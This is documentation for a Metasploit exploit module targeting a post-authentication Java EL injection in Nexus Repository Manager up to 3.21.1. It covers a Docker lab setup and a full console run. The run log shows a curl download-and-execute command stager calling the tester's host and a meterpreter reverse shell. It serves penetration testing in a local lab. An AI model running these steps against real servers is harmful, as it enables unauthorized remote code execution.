## Vulnerable Application

### Description

This module exploits a Java Expression Language (EL) injection in
Nexus Repository Manager versions up to and including 3.21.1 to
execute code as the Nexus user.

This is a post-authentication vulnerability, so credentials are
required to exploit the bug. Any user regardless of privilege level
may be used.

Tested against 3.21.1-01.

### Setup

Install Docker using the [official instructions](https://docs.docker.com/get-docker/).
Follow the instructions for your platform and distribution (if using
Linux). If you're using OS X, you may prefer to `brew cask install docker`
after installing [Homebrew](https://brew.sh/).

#### Starting the application

Run `docker run -d -p 8081:8081 --name nexus sonatype/nexus3:3.21.1`
(note the added `3.21.1` tag) as per Sonatype's [Docker Hub instructions](https://hub.docker.com/r/sonatype/nexus3/#running).

Open a browser and go to <http://localhost:8081/>. If you're greeted by
the Nexus page, then the application has started successfully.

#### Changing the admin user's password

Run `docker exec nexus cat /nexus-data/admin.password` to get the admin
password. Sign in as the `admin` user with the password you just
retrieved.

Follow the prompts in the wizard. Change the password to something you
can remember. You can click through the anonymous access question, since
it's not relevant to the exploit. You don't need to enable the feature.

If you have trouble getting the password change to stick, wait a couple
minutes or browse to <http://localhost:8081/#user/account> and change it
again.

#### Adding an unprivileged user

1. Browse to <http://localhost:8081/#admin/security/users>
2. Click `Create local user` on the current page
3. Fill in all the required fields
  * You can set a fake e-mail address like `user@example.com`
  * Make sure you set a password you can remember, since you'll be using
    it to test the module
  * It is **critical** that you set the `Status` field to `Active` and
    move the `nx-anonymous` role to the `Granted` column
4. Click `Create local user` on the current page
5. Sign out the `admin` account and test your new login

After completing these steps, you may now test the module.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

This targets Nexus Repository Manager versions <= 3.21.1.

## Options

### USERNAME

Set this to a valid Nexus username. It can be an unprivileged user, but
it defaults to `admin` because that is a known account.

### PASSWORD

Set this to a valid Nexus password. No default, since the `admin` user's
password is randomized on install.

## Scenarios

### Nexus Repository Manager 3.21.1-01 from [Docker Hub](https://hub.docker.com/r/sonatype/nexus3)

```
msf5 > use exploit/linux/http/nexus_repo_manager_el_injection
msf5 exploit(linux/http/nexus_repo_manager_el_injection) > options

Module options (exploit/linux/http/nexus_repo_manager_el_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Nexus password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8081             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   admin            yes       Nexus username
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nexus Repository Manager <= 3.21.1


msf5 exploit(linux/http/nexus_repo_manager_el_injection) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(linux/http/nexus_repo_manager_el_injection) > set password admin
password => admin
msf5 exploit(linux/http/nexus_repo_manager_el_injection) > set lhost 192.168.1.3
lhost => 192.168.1.3
msf5 exploit(linux/http/nexus_repo_manager_el_injection) > run

[*] Started reverse TCP handler on 192.168.1.3:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Nexus 3.21.1-01 is a vulnerable version.
[*] Executing command stager for linux/x64/meterpreter_reverse_tcp
[*] Logging in with admin:admin
[+] Logged in with NXSESSIONID=8b6fd077-1830-4e2b-90e8-2997d260b5c0;
[*] Using URL: http://0.0.0.0:8080/t6NXrxF
[*] Local IP: http://192.168.1.3:8080/t6NXrxF
[*] Generated command stager: ["curl -so /tmp/hgzeytII http://192.168.1.3:8080/t6NXrxF", "chmod +x /tmp/hgzeytII", "/tmp/hgzeytII", "rm -f /tmp/hgzeytII"]
[*] Executing command: curl -so /tmp/hgzeytII http://192.168.1.3:8080/t6NXrxF
[+] Successfully executed command: curl -so /tmp/hgzeytII http://192.168.1.3:8080/t6NXrxF
[*] Client 192.168.1.3 (curl/7.61.1) requested /t6NXrxF
[*] Sending payload to 192.168.1.3 (curl/7.61.1)
[*] Command Stager progress -  50.00% done (54/108 bytes)
[*] Executing command: chmod +x /tmp/hgzeytII
[+] Successfully executed command: chmod +x /tmp/hgzeytII
[*] Command Stager progress -  70.37% done (76/108 bytes)
[*] Executing command: /tmp/hgzeytII
[+] Successfully executed command: /tmp/hgzeytII
[*] Command Stager progress -  82.41% done (89/108 bytes)
[*] Executing command: rm -f /tmp/hgzeytII
[+] Successfully executed command: rm -f /tmp/hgzeytII
[*] Command Stager progress - 100.00% done (108/108 bytes)
[*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.3:53094) at 2020-04-07 19:25:38 -0500
[*] Server stopped.

meterpreter > getuid
Server username: no-user @ 282665c16215 (uid=200, gid=200, euid=200, egid=200)
meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Red Hat Enterprise Linux 8 (Linux 4.19.76-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
